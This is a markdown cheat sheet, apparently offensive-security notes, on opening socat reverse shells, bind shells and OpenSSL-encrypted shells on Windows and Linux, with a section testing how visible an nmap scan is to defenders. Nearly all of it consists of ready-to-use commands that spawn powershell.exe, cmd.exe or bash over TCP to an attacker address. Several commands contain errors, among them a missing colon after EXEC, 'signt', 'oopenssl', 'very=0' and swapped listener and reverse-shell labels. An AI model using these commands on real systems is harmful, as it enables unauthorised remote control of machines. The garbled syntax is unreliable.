# Socat Shells

## Windows shell
`pipes` - forces pwsh or cmd to use unix style standard input / output.

Reverse Shell
```sh
socat TCP:10.10.10.10:4200 EXEC:powershell.exe,pipes
```

## Linux
Reverse Shell
```sh
socat tcp-l:4200 -
socat tcp-l:4200 FILE:`tty`,raw,echo=0
```
Listener
| Arg | Description |
| --- | ----------- |
| `pty` | pseudoterminal on target |
| `stderr` | make sure any error messages get shown in the shell |
| `signt` | creates process in new session |
| `sane` | normalize |
```sh
socat TCP:10.10.10.10:4200 EXEC"bash -li",pty,stderr,signt,setsid,sane
```

Bind Shell
```sh
socat TCP-L:4200 EXEC:"bash -li"

```

Listener
```sh
socat TCP:10.10.10.10:4200 -
```
## Stealth Test
Perform the following tests to see how noisy the command is:

### 1. Choose an interface to monitor
`ip a` - View networking information

`eth0` - Selected interface

### 2. Setup a Filter in Wireshark & Capture
Set `tcp.port == 23` in the filter and press capture to monitor traffic.

### 3. Run Scan
`nmap -sV -sC 192.168.1.1 23` 

### 4. View results in Wireshark
By default "Nmap" is printed as the User-Agent making it easily detectiable by defenders. 

### 5. Socat Reverse Shell
A reverse shell gives you access back to the target computer.

```sh
socat -d TCP4-LISTEN:23, fork STDOUT
#or
socat.exe TCP4:192.168.1.22:23 EXEC:'cmd.exe', pipes

```
## Encrypted Shells
1. Generate a certificate
```sh
oopenssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
Create `.pem` file:
```sh
cat shell.key shell.crt > shell.pem
```

Listener:
`very=0` - don't validate if cert has been signed
```sh
socat OPENSSL-LISTEN:4200,cert=shell.pem,verify=0 -
```

Bind Shell Target
```sh
socat OPENSSL-LISTEN:4200,cert=shell.pem,verify=0, EXEC:cmd.exe,pipes
```
Bind Shell Attacker
```sh
socat OPENSSL:<target ip>:<target-port>,verify=0 -
```


